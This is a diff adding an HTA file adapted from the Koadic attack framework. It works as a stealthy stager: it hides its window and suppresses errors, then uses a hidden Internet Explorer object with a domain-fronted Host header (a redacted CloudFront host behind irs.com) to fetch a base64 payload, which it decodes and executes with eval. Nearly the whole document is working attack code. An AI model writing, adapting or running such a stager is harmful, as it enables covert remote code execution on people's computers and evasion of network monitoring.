@@ -1,0 +1,51 @@
+<html>
+<head>
+<script language="JScript">
+// HTA skeleton taken from https://github.com/zerosum0x0/koadic
+window.resizeTo(1, 1);
+window.moveTo(-2000, -2000);
+window.blur();
+
+try
+{
+    window.onfocus = function() { window.blur(); }
+    window.onerror = function(sMsg, sUrl, sLine) { return false; }
+}
+catch (e){}
+
+</script>
+<script language="JScript">
+function decodeBase64(base64) {
+    var dm = new ActiveXObject("Microsoft.XMLDOM");
+    var el = dm.createElement("tmp");
+    el.dataType = "bin.base64";
+    el.text = base64;
+    var b64bytes = el.nodeTypedValue;
+    
+    var asc = new ActiveXObject("System.Text.ASCIIEncoding");
+    return asc.GetString(b64bytes);
+}
+var ie_com = new ActiveXObject("InternetExplorer.Application");
+ie_com.Silent = true;
+ie_com.Visible = false;
+var headers = "Host: <SNIP>.cloudfront.net\r\n";
+ie_com.Navigate2("http://www.irs.com/", 14, 0, null, headers);
+while(ie_com.Busy) {
+    var shell = new ActiveXObject("WScript.Shell");
+    // WScript.Sleep will not work from an HTA
+    shell.Run("ping 127.0.0.1 -n 1", 0, true);
+}
+var resp = ie_com.document.body.innerHTML
+ie_com.Quit();
+decoded = decodeBase64(resp);
+eval(decoded);
+window.close();
+self.close();
+</script>
+<hta:application caption="no" showInTaskBar="no" windowState="minimize"
+                 navigable="no" scroll="no" />
+                 <!--  -->
+</head>
+<body>
+</body>
+</html>
